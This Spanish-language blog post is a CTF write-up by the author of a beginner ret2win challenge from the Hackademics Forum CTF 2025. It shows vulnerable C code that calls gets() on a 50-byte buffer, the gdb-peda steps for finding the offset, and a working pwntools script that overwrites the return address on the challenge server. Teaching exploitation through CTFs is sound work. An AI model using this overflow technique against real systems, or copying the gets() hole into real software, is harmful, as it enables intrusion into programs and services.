---
layout: post
title: Feedback HFCTF 2025
comments: true
categories: [Pwn, Writeups, HFCTF2025]
---

Aquí traigo el segundo reto que implementé para la categoría de Pwn para el [Hackademics Forum CTF](hackademics-forum.com). Como dije se trata de un ejercicio bastante simple pensado para aquellos que se enfrentan por primera vez a esta categoría.

# Overview

Este es un reto clásico de *ret2win*, en el que debemos llamar a una función que imprimirá la flag.

<br>
![Image]({{ site.baseurl }}/images/posts/HFCTF.png){:width="250px"}
<br>

# Reconocimiento

Aunque no es necesario, si descompilamos veremos las siguientes funciones:

```c
void flag() {
    printf("Ejecutame si puedes :)\n");
    exit(0);
}

int main() {
    banner();

    char comment[50];
    printf("Deja una reseña sobre nuestro CTF: ");
    gets(comment);
    printf("Gracias! Esperamos que lo hayas disfrutado.\n");
    printf("\n(Te crees que te voy a dar una flag solo por quejarte?)\n\n");

    return 0;
}
```

Vemos que la función flag nunca es llamada. Sin embargo, disponemos de una llamada a *gets* en main, con lo que podemos desbordar el rsp e insertar la dirección de flag en la dirección de retorno, para que al terminar de ejecutar main, saltemos a flag.

Para ello debemos encontrar el offset hasta dicha dirección de retorno. Podemos hacerlo con gdb-peda, generando un patrón con `pattern create 200`, pasándoselo al programa y viendo el valor de rsp. Con `pattern offset <rsp>` tendremos el offset.

# Explotación

Para resolverlo debemos explotar el buffer overflow en el servidor, para ello utilizaremos este script:

```python
#!/bin/python3

from pwn import *

binary = '../gen/feedback'
elf = ELF(binary)

if args.LOCAL: 
    p = process(binary)

elif args.REMOTE:
    p = remote('ctf.hackademics-forum.com', 41422)
    #p = remote("ctf.hackademics-forum.com", 41422)

offset = 72
padding = b'a' * offset
flag=p64(0x40145f) # type: ignore

payload = padding + flag

log.info("Enviando exploit...")

p.sendline(payload)

p.interactive()
```